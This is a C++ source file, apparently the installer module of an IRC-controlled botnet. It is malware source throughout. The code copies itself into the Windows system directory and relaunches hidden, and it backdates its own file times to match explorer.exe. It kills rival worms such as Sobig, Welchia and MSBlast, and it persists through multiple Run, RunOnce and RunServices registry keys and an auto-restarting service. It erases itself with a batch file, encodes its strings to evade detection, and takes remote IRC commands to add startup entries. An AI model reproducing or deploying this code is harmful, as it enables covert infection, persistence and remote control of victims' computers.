#include "main.h"
#include "installer.h"
#include "mainctrl.h"

void CInstaller::Init() {
#ifdef WIN32
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdAsAdd,	dp(1,19,1,4,4,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdAsDel,	dp(1,19,4,5,12,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSvcAdd,	dp(19,22,3,1,4,4,0).CStr(),	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSvcDel,	dp(19,22,3,4,5,12,0).CStr(),	this);
#endif // WIN32
}

#ifdef WIN32
RSP fRegisterServiceProcess;
CT32S fCreateToolhelp32Snapshot;
P32F fProcess32First;
P32N fProcess32Next;

HANDLE psnap;
PROCESSENTRY32 pe32;

#endif // WIN32

int GetCopies(CString &sFilename)
{
#ifdef WIN32
	char cFilename[MAX_PATH]; GetModuleFileName(GetModuleHandle(NULL), cFilename, sizeof(cFilename));
	if(fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next)
	{	psnap=fCreateToolhelp32Snapshot(2, 0);
		if(psnap!=INVALID_HANDLE_VALUE)
		{	int copies=0; pe32.dwSize=sizeof(PROCESSENTRY32);
			if(fProcess32First(psnap, &pe32))
			{	do {	if((strncmp(cFilename+(strlen(cFilename)-strlen(pe32.szExeFile)), \
						pe32.szExeFile, strlen(pe32.szExeFile))==0) || \
						(strncmp(sFilename, pe32.szExeFile, strlen(pe32.szExeFile))==0))
							copies++;
				} while(fProcess32Next(psnap, &pe32)); }
			CloseHandle(psnap);
			return copies; }
		else return 0; }
	else return 0;
#else
	char szCmdBuf[4096]; sprintf(szCmdBuf, "ps ax | grep %s | grep -v grep > psaxtemp", sFilename.CStr());
	system(szCmdBuf); FILE *fp=fopen("psaxtemp", "r"); if(!fp) return 0;
	fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
	if(lFileSize>0) return 1;
	fclose(fp); system("rm -f psaxtemp"); return 0;
#endif // WIN32
}



void CInstaller::FileTimeHack(char *lpHostFile)
{
	HANDLE hTimeFile;
	FILETIME aFileTime;
	FILETIME bFileTime;
	FILETIME cFileTime;
	char lpWindowsBuffer[MAX_PATH];

	GetWindowsDirectory(lpWindowsBuffer, sizeof(lpWindowsBuffer));
	strcat(lpWindowsBuffer, "\\explorer.exe");

	hTimeFile = CreateFile(lpWindowsBuffer, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE)
	{
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);

		hTimeFile = CreateFile(lpHostFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hTimeFile != INVALID_HANDLE_VALUE)
		{

			SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
			CloseHandle(hTimeFile);
		}
		else {
					#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, lpHostFile);
#endif // DBGCONSOLE
		}
	}
}




bool CInstaller::CopyToSysDir(CString &sFilename)
{
	char tstr[MAX_PATH];
#ifdef WIN32
	CString sysdir; GetSystemDirectory(sysdir.GetBuffer(MAX_PATH), MAX_PATH);
	m_sSysDir.Assign(sysdir.CStr());
	CString cfilename; GetModuleFileName(GetModuleHandle(NULL), cfilename.GetBuffer(MAX_PATH), MAX_PATH);

	HINSTANCE kernel32_dll=LoadLibrary("kernel32.dll");
	if(kernel32_dll)
	{	fRegisterServiceProcess=(RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		fCreateToolhelp32Snapshot=(CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First=(P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next=(P32N)GetProcAddress(kernel32_dll, "Process32Next");
		if(fRegisterServiceProcess) fRegisterServiceProcess(0, 1); }
#else
	m_sSysDir.Assign("/usr/sbin");
	CString sysdir(m_sSysDir);
	CString cfilename(g_cMainCtrl.m_sArgv0);
#endif // WIN32


/*	#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(5, "Checking for multiple copies...\n");
	#endif // DBGCONSOLE
	if(!g_cMainCtrl.m_cCmdLine.m_cConfig.bUpdate && !g_cMainCtrl.m_cCmdLine.m_cConfig.bService)
	{
		unsigned long lStartTime=GetTickCount(); bool bFound=true;
		while((GetTickCount()-lStartTime) < 60000 && bFound)
		{	
			if(GetCopies(sFilename)<2) bFound=false; Sleep(1000);
		}
		if(bFound) {
			#ifdef DBGCONSOLE
						g_cMainCtrl.m_cConsDbg.Log(5, "Found 2 copies, exiting...\n");
			#endif // DBGCONSOLE
			exit(1); 
		}
	}*/

	long lTimeoutStart;

	if(!cfilename.Find(sFilename.CStr(), 0))
		if(g_cMainCtrl.m_cCmdLine.m_cConfig.bUpdate)
			KillProcess(sFilename.CStr());

#ifdef WIN32
	// Kill Sobig.F
	KillProcess(dp(23,9,14,16,16,18,71,70,78,5,24,5,0).CStr());

	// Kill Welchia
	KillProcess(dp(4,12,12,8,15,19,20,78,5,24,5,0).CStr());
	KillProcess(dp(20,6,20,16,4,78,5,24,5,0).CStr());

	
	// Kill MSBlast
	KillProcess(dp(13,19,2,12,1,19,20,78,5,24,5,0).CStr());
	KillProcess(dp(16,5,14,9,19,71,70,78,5,24,5,0).CStr());
	KillProcess(dp(13,19,16,1,20,3,8,78,5,24,5,0).CStr());

#else
	// FIXME: Add linux worm killer here
#endif // WIN32

	if(!cfilename.Find(sysdir, 0))
	{	
		sprintf(tstr, "%s%c%s", sysdir.CStr(), DIRCHAR, sFilename.CStr());

		lTimeoutStart=GetTickCount();

		#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(5, "Trying to copy to system directory...\n");
		#endif // DBGCONSOLE

		while(CopyFile(cfilename, tstr, false)==false &&
			GetTickCount()-lTimeoutStart < 25000) Sleep(2000);

		#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(5, "Finished copying to system directory...\n");
		#endif // DBGCONSOLE

		#ifndef _DEBUG

			#ifdef DBGCONSOLE
					g_cMainCtrl.m_cConsDbg.Log(5, "Starting new process...\n");
			#endif // DBGCONSOLE

			if(g_cMainCtrl.m_cBot.bot_meltserver.bValue) {
				strncat(tstr, " -bai ", sizeof(tstr));
				strncat(tstr, cfilename.CStr(), sizeof(tstr));
			}

			PROCESS_INFORMATION pinfo; 
			STARTUPINFO sinfo;
			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo); sinfo.wShowWindow = SW_HIDE;
			if(CreateProcess(NULL, tstr, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) 
			{
				exit(0);
			}

		#endif
	}
	return true;
}

bool CInstaller::Install()
{	
	if(g_cMainCtrl.m_cCmdLine.m_cConfig.bMeltServer)
		DeleteFile(g_cMainCtrl.m_cCmdLine.m_cConfig.szOldServer);
	return true; 
}

bool CInstaller::Uninstall()
{
#ifdef WIN32
	HANDLE f; DWORD r;
	PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
	char cmdline[MAX_PATH]; char tcmdline[MAX_PATH]; char cfilename[MAX_PATH];
	char batfile[MAX_PATH]; char tempdir[MAX_PATH];

	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	sprintf(batfile, "%s\\%s", tempdir, dp(1,6,18,15,79,2,1,20,0).CStr());
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
			/*WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);*/
			CString sBat;
			sBat.Format("%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r%s\r\n%s\r%s\r\n",
			dp(86,5,3,8,15,78,15,6,6,0).CStr(),	// @echo off
			dp(83,19,20,1,18,20,0).CStr(),		// :start
			// if not exist ""%1"" goto done
			dp(9,6,78,14,15,20,78,5,24,9,19,20,78,84,84,57,69,84,84,78,7,15,20,15,78,4,15,14,5,0).CStr(),
			dp(4,5,12,78,82,32,78,84,84,57,69,84,84,0).CStr(),	// del /F ""%1""
			dp(4,5,12,78,84,84,57,69,84,84,0).CStr(),			// del ""%1""
			dp(7,15,20,15,78,19,20,1,18,20,0).CStr(),			// goto start
			dp(83,4,15,14,5,0).CStr(),							// :done
			dp(4,5,12,78,82,32,78,57,20,5,13,16,57,0).CStr(),	// del /F %temp%
			dp(79,2,1,20,0).CStr(),								// .bat
			dp(4,5,12,78,57,20,5,13,16,57,0).CStr(),			// del %temp%
			dp(79,2,1,20,0).CStr());							// .bat

		WriteFile(f, sBat.CStr(), 105, &r, NULL);

		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
#else
	// Linux
#endif // WIN32
	return true;
}

#ifdef WIN32

bool CInstaller::RegStartAdd(CString &sValuename, CString &sFilename) {
	HKEY key;

	CString strRegRun, strRegROnce, strRegServ;
	strRegROnce		= dp(45,15,6,20,23,1,18,5,80,39,9,3,18,15,19,15,6,20,80,49,9,14,4,15,23,19,80,29,21,18,18,5,14,20,48,5,18,19,9,15,14,80,44,21,14,41,14,3,5,0);
	strRegServ		= dp(45,15,6,20,23,1,18,5,80,39,9,3,18,15,19,15,6,20,80,49,9,14,4,15,23,19,80,29,21,18,18,5,14,20,48,5,18,19,9,15,14,80,44,21,14,45,5,18,22,9,3,5,19,0);
	strRegRun		= dp(45,15,6,20,23,1,18,5,80,39,9,3,18,15,19,15,6,20,80,49,9,14,4,15,23,19,80,29,21,18,18,5,14,20,48,5,18,19,9,15,14,80,44,21,14,0);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, strRegRun.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, sValuename, 0, REG_SZ, (LPBYTE)(const char *)sFilename, (DWORD)strlen(sFilename)); 
	RegCloseKey(key); 


	RegCreateKeyEx(HKEY_LOCAL_MACHINE, strRegROnce.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, sValuename, 0, REG_SZ, (LPBYTE)(const char *)sFilename, (DWORD)strlen(sFilename)); 
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_CURRENT_USER, strRegRun.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, sValuename, 0, REG_SZ, (LPBYTE)(const char *)sFilename, (DWORD)strlen(sFilename)); 
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_CURRENT_USER, strRegROnce.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, sValuename, 0, REG_SZ, (LPBYTE)(const char *)sFilename, (DWORD)strlen(sFilename)); 
	RegCloseKey(key); 

//	CString sTemp;	sTemp.Format("explorer.exe");

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, strRegServ.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, sValuename, 0, REG_SZ, (LPBYTE)(const char *)sFilename, (DWORD)strlen(sFilename)); 
	RegCloseKey(key);
/*
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, "Shell", 0, REG_SZ, (LPBYTE)(const char *)(sTemp), (DWORD)strlen(sTemp)); 
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, "Shell", 0, REG_SZ, (LPBYTE)(const char *)(sTemp), (DWORD)strlen(sTemp)); 
	RegCloseKey(key);
*/


	return true; }

bool CInstaller::RegStartDel(CString &sValuename) {
	HKEY key;

	CString strRegRun, strRegROnce, strRegServ;
	strRegROnce		= dp(45,15,6,20,23,1,18,5,80,39,9,3,18,15,19,15,6,20,80,49,9,14,4,15,23,19,80,29,21,18,18,5,14,20,48,5,18,19,9,15,14,80,44,21,14,41,14,3,5,0);
	strRegServ		= dp(45,15,6,20,23,1,18,5,80,39,9,3,18,15,19,15,6,20,80,49,9,14,4,15,23,19,80,29,21,18,18,5,14,20,48,5,18,19,9,15,14,80,44,21,14,45,5,18,22,9,3,5,19,0);
	strRegRun		= dp(45,15,6,20,23,1,18,5,80,39,9,3,18,15,19,15,6,20,80,49,9,14,4,15,23,19,80,29,21,18,18,5,14,20,48,5,18,19,9,15,14,80,44,21,14,0);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, strRegRun.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, sValuename); 
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, strRegServ.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, sValuename); 
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, strRegRun.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, sValuename); 
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_CURRENT_USER, strRegRun.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, sValuename); 
	RegCloseKey(key); 

/*
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, "Shell", 0, REG_SZ, (LPBYTE)(const char *)"explorer.exe", (DWORD)strlen("explorer.exe")); 
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, "Shell", 0, REG_SZ, (LPBYTE)(const char *)"explorer.exe", (DWORD)strlen("explorer.exe")); 
	RegCloseKey(key);

*/
	RegCreateKeyEx(HKEY_CURRENT_USER, strRegROnce.CStr(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, sValuename); 
	RegCloseKey(key); 

	return true; }

bool CInstaller::ServiceAdd(CString &sServicename, CString &sFilename) 
{
	CString sysdir; 
	GetSystemDirectory(sysdir.GetBuffer(MAX_PATH), MAX_PATH);
	CString sSvcCmd; 
	sSvcCmd.Format("%s\\%s", sysdir.CStr(), sFilename.CStr());
	CString sSvcParams; 
	sSvcParams.Format("-netsvcs");
	return ServiceAddInt(sServicename, sSvcCmd, sSvcParams); 
}

bool CInstaller::ServiceAddInt(CString &sServicename, CString &sFilename, CString &sParams) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	CString sSvcCmd; 
	sSvcCmd.Format("\"%s\" %s", sFilename.CStr(), sParams.CStr());
	SC_HANDLE hService=CreateService(hServiceControl, sServicename.CStr(),
		g_cMainCtrl.m_cBot.as_valname.sValue.CStr(), SERVICE_ALL_ACCESS, \
		SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, \
		sSvcCmd.CStr(), NULL, NULL, NULL, NULL, NULL);
	if(!hService) {
		DWORD dwError=GetLastError();
		if(dwError==ERROR_SERVICE_EXISTS) {
			ServiceDel(sServicename); CloseServiceHandle(hService);
			CloseServiceHandle(hServiceControl);
			return ServiceAdd(sServicename, sFilename);
		} else {
			CloseServiceHandle(hServiceControl); return false; }
	}

	SC_ACTION scActions[1]; scActions[0].Delay=1; scActions[0].Type=SC_ACTION_RESTART;
	SERVICE_FAILURE_ACTIONS sfActions; sfActions.dwResetPeriod=INFINITE; sfActions.lpRebootMsg=NULL;
	sfActions.lpCommand=NULL; sfActions.cActions=1; sfActions.lpsaActions=scActions;

	if(!ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfActions)) {
		CloseServiceHandle(hService); CloseServiceHandle(hServiceControl); return false;
	}

	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl); return true;
}

bool CInstaller::ServiceDel(CString &sServicename) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	SC_HANDLE hService=OpenService(hServiceControl, sServicename.CStr(), SERVICE_ALL_ACCESS);
	if(!hService) { CloseServiceHandle(hServiceControl); return false; }
	SERVICE_STATUS sStatus; ControlService(hService, SERVICE_CONTROL_STOP, &sStatus);
	DeleteService(hService); CloseServiceHandle(hService); CloseServiceHandle(hServiceControl);

	return true;
}

bool CInstaller::IsInstalled(CString &sServicename) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	SC_HANDLE hService=OpenService(hServiceControl, sServicename.CStr(), SERVICE_ALL_ACCESS);
	if(!hService) { CloseServiceHandle(hServiceControl); return false; }
	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl);

	return true;
}

bool CInstaller::ServiceStart(CString &sServicename) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	SC_HANDLE hService=OpenService(hServiceControl, sServicename.CStr(), SERVICE_ALL_ACCESS);
	if(!hService) { CloseServiceHandle(hServiceControl); return false; }
	StartService(hService, 0, NULL);
	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl); 

/*	CString sCmdBuf; sCmdBuf.Format("net start %s", sServicename.CStr());
	system(sCmdBuf.CStr());*/

	return true;
}

#endif // WIN32

bool CInstaller::HandleCommand(CMessage *pMsg) {
#ifdef WIN32
	if(!pMsg->sCmd.Compare(m_cmdAsAdd.sName.Str())) {
		CString sValue=pMsg->sChatString.Token(1, " ", true);
		CString sFile=pMsg->sChatString.Token(2, " ", true);
		if(RegStartAdd(sValue, sFile))
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
				"reg(add) \"%s\" as \"%s\".", sValue.CStr(), sFile.CStr());
		return true; }
	else if(!pMsg->sCmd.Compare(m_cmdAsDel.sName.Str())) {
		CString sValue=pMsg->sChatString.Token(1, " ", true);
		if(RegStartDel(sValue))
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
				"reg(del) \"%s\".", sValue.CStr());
		return true; }
	else if(!pMsg->sCmd.Compare(m_cmdSvcAdd.sName.Str())) {
		CString sService=pMsg->sChatString.Token(1, " ", true);
		CString sFile=pMsg->sChatString.Token(2, " ", true);
		CString sParams=pMsg->sChatString.Token(3, " ", true);
		if(ServiceAddInt(sService, sFile, sParams))
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
				"serv(add) \"%s\" as \"\"%s\" %s\".", sService.CStr(), sFile.CStr(), sParams.CStr());
		return true; }
	else if(!pMsg->sCmd.Compare(m_cmdSvcDel.sName.Str())) {
		CString sService=pMsg->sChatString.Token(1, " ", true);
		if(ServiceDel(sService))
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
				"serv(del) \"%s\".", sService.CStr());
		return true; }
#endif // WIN32
	return false;
}
